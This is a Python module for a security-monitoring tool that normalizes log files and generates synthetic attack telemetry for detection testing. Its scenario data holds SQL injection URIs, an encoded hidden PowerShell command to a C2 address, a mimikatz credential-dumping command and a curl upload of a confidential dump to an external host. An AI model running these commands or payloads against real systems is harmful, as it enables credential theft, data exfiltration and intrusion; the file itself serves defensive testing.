import os
import json
import random
import datetime

DEFAULT_LOG_PATH = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "sample_logs")
IST = datetime.timezone(datetime.timedelta(hours=5, minutes=30), name="IST")

def normalize_log(entry):
    """Normalizes raw logs into a standardized SOC Common Event Format."""
    return {
        "id": entry.get("id", f"LOG-{random.randint(1000, 9999)}"),
        "timestamp": entry.get("timestamp", datetime.datetime.now(IST).isoformat()),
        "source_ip": entry.get("source_ip", entry.get("ip", "127.0.0.1")),
        "destination_ip": entry.get("destination_ip", "10.0.0.1"),
        "source_port": int(entry.get("source_port", 0)),
        "destination_port": int(entry.get("destination_port", 80)),
        "protocol": entry.get("protocol", "TCP").upper(),
        "event_type": entry.get("event_type", "network_flow"),
        "user": entry.get("user", "unknown"),
        "host": entry.get("host", "workstation-01"),
        "failed_attempts": int(entry.get("failed_attempts", 0)),
        "bytes_out": int(entry.get("bytes_out", 0)),
        "bytes_in": int(entry.get("bytes_in", 0)),
        "uri_path": entry.get("uri_path"),
        "process_name": entry.get("process_name"),
        "command": entry.get("command"),
        "raw_payload": entry.get("raw_payload", ""),
    }

def collect_logs(path=DEFAULT_LOG_PATH):
    """Collects and normalizes logs from all JSON files in the specified path."""
    logs = []
    if not os.path.exists(path):
        return logs

    for file in os.listdir(path):
        if file.endswith(".json"):
            file_path = os.path.join(path, file)
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    if isinstance(data, list):
                        for item in data:
                            logs.append(normalize_log(item))
                    elif isinstance(data, dict):
                        logs.append(normalize_log(data))
            except Exception as e:
                print(f"[INGESTION ERROR] Error reading {file_path}: {e}")
    return logs

def generate_synthetic_telemetry(scenario="benign", count=1):
    """
    Generates synthetic realistic telemetry on demand for continuous streaming or testing.
    Scenarios: 'benign', 'brute_force', 'sqli', 'c2_beacon', 'exfiltration', 'mimikatz', 'random'
    """
    scenarios = ["benign", "brute_force", "sqli", "c2_beacon", "exfiltration", "mimikatz"]
    if scenario == "random":
        scenario = random.choice(scenarios)

    now = datetime.datetime.now(IST).isoformat()
    generated = []

    for _ in range(count):
        log_id = f"SIM-{random.randint(2000, 9999)}"
        if scenario == "brute_force":
            src = f"198.51.100.{random.randint(10, 250)}"
            fails = random.randint(12, 45)
            generated.append({
                "id": log_id,
                "timestamp": now,
                "source_ip": src,
                "destination_ip": "10.0.0.15",
                "source_port": random.randint(40000, 65000),
                "destination_port": 22,
                "protocol": "TCP",
                "event_type": "authentication",
                "user": random.choice(["root", "admin", "service", "ubuntu"]),
                "host": "auth-srv-prod-01",
                "failed_attempts": fails,
                "bytes_out": 1200 + fails * 40,
                "bytes_in": 300,
                "uri_path": None,
                "process_name": "sshd",
                "command": "sshd: auth failure",
                "raw_payload": f"High rate authentication failure: {fails} consecutive failed attempts"
            })
        elif scenario == "sqli":
            src = f"185.220.101.{random.randint(5, 99)}"
            payloads = [
                "/api/search?q=1%27%20OR%201=1--",
                "/login?user=admin%27--",
                "/products?id=10%20UNION%20SELECT%20null,schema_name%20FROM%20information_schema.schemata--"
            ]
            chosen_payload = random.choice(payloads)
            generated.append({
                "id": log_id,
                "timestamp": now,
                "source_ip": src,
                "destination_ip": "10.0.0.80",
                "source_port": random.randint(30000, 60000),
                "destination_port": 443,
                "protocol": "TCP",
                "event_type": "web_request",
                "user": "anonymous",
                "host": "web-gateway-01",
                "failed_attempts": 0,
                "bytes_out": 4200,
                "bytes_in": 950,
                "uri_path": chosen_payload,
                "process_name": "nginx",
                "command": None,
                "raw_payload": f"WAF Suspicious Input: {chosen_payload}"
            })
        elif scenario == "c2_beacon":
            src = f"10.0.0.{random.randint(20, 60)}"
            c2_ip = "194.26.29.112"
            generated.append({
                "id": log_id,
                "timestamp": now,
                "source_ip": src,
                "destination_ip": c2_ip,
                "source_port": random.randint(45000, 65000),
                "destination_port": 8443,
                "protocol": "TCP",
                "event_type": "network_flow",
                "user": "system",
                "host": f"workstation-{random.randint(10, 50)}",
                "failed_attempts": 0,
                "bytes_out": 350,
                "bytes_in": 210,
                "uri_path": "/beacon/agent?sid=991",
                "process_name": "powershell.exe",
                "command": "powershell -WindowStyle Hidden -enc SUVYKE5ldy1PYmplY3Q...",
                "raw_payload": f"Periodic encrypted beacon detected to C2 server {c2_ip}"
            })
        elif scenario == "mimikatz":
            src = f"10.0.0.{random.randint(20, 60)}"
            generated.append({
                "id": log_id,
                "timestamp": now,
                "source_ip": src,
                "destination_ip": "10.0.0.5",
                "source_port": random.randint(49000, 55000),
                "destination_port": 445,
                "protocol": "TCP",
                "event_type": "endpoint_event",
                "user": "compromised_user",
                "host": "workstation-corp-09",
                "failed_attempts": 0,
                "bytes_out": 5200,
                "bytes_in": 310,
                "uri_path": None,
                "process_name": "mimikatz.exe",
                "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
                "raw_payload": "Suspicious credential extraction: LSASS process memory read by unauthorized binary"
            })
        elif scenario == "exfiltration":
            src = f"10.0.0.{random.randint(20, 60)}"
            dest = "45.142.166.11"
            generated.append({
                "id": log_id,
                "timestamp": now,
                "source_ip": src,
                "destination_ip": dest,
                "source_port": random.randint(50000, 60000),
                "destination_port": 9001,
                "protocol": "TCP",
                "event_type": "network_flow",
                "user": "corp_backup",
                "host": "database-internal-01",
                "failed_attempts": 0,
                "bytes_out": random.randint(80000000, 250000000),
                "bytes_in": 1200,
                "uri_path": None,
                "process_name": "curl.exe",
                "command": f"curl -T confidential_dump.tar.gz ftp://{dest}:9001/upload",
                "raw_payload": f"Large volume data exfiltration ({random.randint(80, 250)} MB) to unknown external target {dest}"
            })
        else: # benign
            src = f"10.0.0.{random.randint(100, 200)}"
            generated.append({
                "id": log_id,
                "timestamp": now,
                "source_ip": src,
                "destination_ip": "10.0.0.1",
                "source_port": random.randint(30000, 60000),
                "destination_port": random.choice([80, 443, 53]),
                "protocol": "TCP",
                "event_type": "web_request",
                "user": random.choice(["jdoe", "asmith", "dev_ops", "finance_user"]),
                "host": f"workstation-user-{random.randint(1, 99)}",
                "failed_attempts": random.choice([0, 0, 0, 1]),
                "bytes_out": random.randint(200, 1500),
                "bytes_in": random.randint(1000, 15000),
                "uri_path": random.choice(["/index.html", "/api/user/profile", "/static/logo.png", "/docs/guide"]),
                "process_name": random.choice(["chrome.exe", "firefox.exe", "slack.exe"]),
                "command": None,
                "raw_payload": "Benign business traffic; verified internal host activity"
            })
    return generated
